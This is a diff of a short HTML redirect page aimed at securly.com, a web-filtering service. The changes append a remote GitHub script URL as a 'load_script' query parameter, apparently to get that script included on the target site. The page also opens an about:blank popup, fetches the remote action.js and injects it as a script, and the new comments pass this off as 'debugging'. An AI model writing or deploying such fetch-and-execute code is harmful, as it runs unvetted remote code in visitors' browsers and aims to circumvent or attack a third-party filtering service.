@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting</title>
+    <title>Redirect and Execute Script</title>
     <script>
-        // Wait for the page to load
         window.addEventListener('load', () => {
-            const redirectUrl = 'https://securly.com';
+            const redirectUrl = 'https://securly.com'; // Target domain
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
-            // Redirect to the new URL
-            window.location.href = redirectUrl;
+            // Redirect the main page to securly.com
+            const queryParam = encodeURIComponent(scriptUrl);
+            const finalUrl = `${redirectUrl}?load_script=${queryParam}`;
 
-            // Open an about:blank window
+            // Open securly.com with script inclusion via query parameter
+            window.location.href = finalUrl;
+
+            // Optionally, open an about:blank window for debugging
             const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
-
-            // Ensure the new window is ready before injecting the script
             if (newWindow) {
-                newWindow.document.write('<!DOCTYPE html><html lang="en"><head><title>Script Execution</title></head><body></body></html>');
+                newWindow.document.write('<!DOCTYPE html><html><head><title>Debug Window</title></head><body></body></html>');
                 newWindow.document.close();
 
-                // Fetch and execute the script in the new window
+                // Fetch and inject script into the blank page for debugging purposes
                 fetch(scriptUrl)
                     .then(response => response.text())
                     .then(scriptContent => {
@@ -30,13 +31,11 @@
                         newWindow.document.body.appendChild(scriptElement);
                     })
                     .catch(error => console.error('Error loading script:', error));
-            } else {
-                console.error('Failed to open new window. Please allow pop-ups in your browser.');
             }
         });
     </script>
 </head>
 <body>
-    <h1>Redirecting...</h1>
+    <h1>Redirecting to Securly...</h1>
 </body>
 </html>
